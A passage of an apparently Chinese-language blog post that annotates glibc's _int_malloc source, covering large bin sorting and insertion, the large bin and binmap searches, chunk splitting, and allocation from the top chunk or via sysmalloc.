(size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>否则属于large bin范围，则进入如下分支。这里需要注意large bin的组织形式，不同大小的large chunk之间用<code>fd_nextsize</code>与<code>bk_nextsize</code>组织，而相同大小的large chunk用<code>fd</code>与<code>bk</code>相连。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line"><span class="comment">//判断该large bin是否为空</span></span><br><span class="line">    <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck)<span class="comment">//不为空则进一步操作</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">        size |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">        assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">        <span class="comment">//bck-&gt;bk指向的是该bin中最小的chunk</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">&lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))<span class="comment">//如果这个chunk的大小比所有的chunk都要小</span></span><br><span class="line">          &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"><span class="comment">//将其链入最后</span></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//否则则挑一个合适的地方进行链入</span></span><br><span class="line">          &#123;</span><br><span class="line">            assert (chunk_main_arena (fwd));</span><br><span class="line">            <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">              &#123;</span><br><span class="line">                fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">assert (chunk_main_arena (fwd));</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size <span class="comment">//如果刚刚好有个相同大小的chunk链，则会放进相同chunk链的链表</span></span><br><span class="line">== (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">              <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">              fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span><span class="comment">//否则将chunk链入新的位置</span></span><br><span class="line">              &#123;</span><br><span class="line">                victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                  malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">                fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">              &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">            <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">              malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">//为空则设置victim的fd_nextsize和bk_nextsize都为自己</span></span><br><span class="line">      victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>然后将victim链入对应的bin中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>之后是一些tcache bin的操作，tcache_unsorted_count自增，如果return_cached不为零，并且满足一些条件后，则从tcache中寻找chunk并返还。</p><p>如果循环次数足够多了，就退出这个循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span></span><br><span class="line"><span class="comment">filling the cache, return one of the cached ones.  */</span></span><br><span class="line">  ++tcache_unsorted_count;</span><br><span class="line">  <span class="keyword">if</span> (return_cached</span><br><span class="line">&amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span> <span class="comment">//mp_.tcache_unsorted_limit是被从初始化为0的</span></span><br><span class="line">&amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">      <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><h6 id="真正的large-bin搜索阶段"><a href="#真正的large-bin搜索阶段" class="headerlink" title="真正的large bin搜索阶段"></a>真正的large bin搜索阶段</h6><p>如果unsorted bin中也搜不到的话，之后便是在large bin中搜索的过程。这个也位于那个<code>for(;;)</code>的大循环当中。这个和之前那个<code>unsorted bin</code>中的过程有点类似。但是之前那个是将unsorted bin中的chunk取出放进large bin中(如果大小合适的话)，而这里是从large bin中取合适的chunk，可能涉及到chunk的切割操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">  bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果bin为空或者bin中的chunk都太小，则跳过</span></span><br><span class="line">  <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">  <span class="keyword">if</span> ((victim = first (bin)) != bin</span><br><span class="line">&amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (victim)</span><br><span class="line">  &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      victim = victim-&gt;bk_nextsize;</span><br><span class="line">      <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))) <span class="comment">//找到一个大小合适的chunksize，也就是第一个大于等于nb的chunk</span></span><br><span class="line">        victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">          list does not have to be rerouted.  */</span></span><br><span class="line">      <span class="comment">//这里判断了选取的victim是否是bin中最后一个(也就是最小的)，并且同一个chunk链的两个chunk大小相同</span></span><br><span class="line">      <span class="keyword">if</span> (victim != last (bin)</span><br><span class="line">&amp;&amp; chunksize_nomask (victim)</span><br><span class="line">== chunksize_nomask (victim-&gt;fd))</span><br><span class="line">        victim = victim-&gt;fd;</span><br><span class="line"><span class="comment">//把victim取下，进行切割</span></span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      unlink_chunk (av, victim);</span><br><span class="line"><span class="comment">//如果切下来之后剩余块过小，则不进行分割，直接返还给用户(所以会有冗余)</span></span><br><span class="line">      <span class="comment">/* Exhaust */</span></span><br><span class="line">      <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">        &#123;</span><br><span class="line">          set_inuse_bit_at_offset (victim, size);</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (victim);</span><br><span class="line">        &#125;</span><br><span class="line">  <span class="comment">//否则进行分割，然后放入unsorted bin中</span></span><br><span class="line">      <span class="comment">/* Split */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">              have to perform a complete insert here.  */</span></span><br><span class="line">          bck = unsorted_chunks (av);</span><br><span class="line">          fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">          <span class="comment">//这些就是把分割后的remainder链入unsorted bin的过程</span></span><br><span class="line">          remainder-&gt;bk = bck;</span><br><span class="line">          remainder-&gt;fd = fwd;</span><br><span class="line">          bck-&gt;fd = remainder;</span><br><span class="line">          fwd-&gt;bk = remainder;</span><br><span class="line">          <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">            &#123;</span><br><span class="line">              remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">              remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">          set_foot (remainder, remainder_size);</span><br><span class="line">        &#125;</span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="进一步的large-bin搜索与top-chunk环节"><a href="#进一步的large-bin搜索与top-chunk环节" class="headerlink" title="进一步的large bin搜索与top chunk环节"></a>进一步的large bin搜索与top chunk<strong>环节</strong></h6><p>如果在大小适合的large bin中还没有找到的话，则去下一个更大的链表中去查找然后切割，如果还是没有就去top chunk那去切割</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">++idx;</span><br><span class="line">bin = bin_at (av, idx);</span><br><span class="line">block = idx2block (idx);</span><br><span class="line"><span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span> <span class="comment">//如果搜完了还是没有，就去top chunk</span></span><br><span class="line">              <span class="keyword">goto</span> use_top;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">        bit = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">    <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        bin = next_bin (bin);</span><br><span class="line">        bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        assert (bit != <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//找到了合适的bin，然后取victim</span></span><br><span class="line">    <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">    victim = last (bin);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">    <span class="comment">//victim==bin，意味着这个bin为空</span></span><br><span class="line">    <span class="keyword">if</span> (victim == bin)</span><br><span class="line">      &#123;</span><br><span class="line">        av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">        bin = next_bin (bin);</span><br><span class="line">        bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//如果不为空，则直接取。由于我们是从更大的large bin中去取得，所以大小不出意外的话是没问题的，这里还是做了一个size&gt;=nb得判断</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">        assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line"><span class="comment">//类似刚刚的large bin操作，是一个取出然后切割的过程</span></span><br><span class="line">        <span class="comment">/* unlink */</span></span><br><span class="line">        unlink_chunk (av, victim);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Exhaust */</span></span><br><span class="line">        <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">          &#123;</span><br><span class="line">            set_inuse_bit_at_offset (victim, size);</span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">  set_non_main_arena (victim);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Split */</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                have to perform a complete insert here.  */</span></span><br><span class="line">            bck = unsorted_chunks (av);</span><br><span class="line">            fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>);</span><br><span class="line">            remainder-&gt;bk = bck;</span><br><span class="line">            remainder-&gt;fd = fwd;</span><br><span class="line">            bck-&gt;fd = remainder;</span><br><span class="line">            fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">            <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">              &#123;</span><br><span class="line">                remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                      (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">            set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">            set_foot (remainder, remainder_size);</span><br><span class="line">          &#125;</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果遍历完了还是没有，则会去top chunk那去取</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span> <span class="comment">//如果搜完了还是没有，就去top chunk</span></span><br><span class="line"><span class="keyword">goto</span> use_top;</span><br></pre></td></tr></table></figure><p>去top chunk取的分析如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">      (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">      search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">      less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">      be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">      limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">      MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">      exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">      reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">      to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">  victim = av-&gt;top;</span><br><span class="line">  size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      remainder = chunk_at_offset (victim, nb);</span><br><span class="line">      av-&gt;top = remainder;</span><br><span class="line">      set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">      here for all block sizes.  */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">    &#123;</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">      <span class="comment">/* restore original bin index */</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">        idx = smallbin_index (nb);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        idx = largebin_index (nb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里的过程很清楚，首先判断top chunk的大小是否足够，如果足够那么直接切割</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果不够的话，并且存有fastchunk，那么就会调用<code>malloc_consolidate</code>进行一个chunk合并的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">    here for all block sizes.  */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">  &#123;</span><br><span class="line">    malloc_consolidate (av);</span><br><span class="line">    <span class="comment">/* restore original bin index */</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>否则的话，就需要调用sysmalloc进行分配了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span 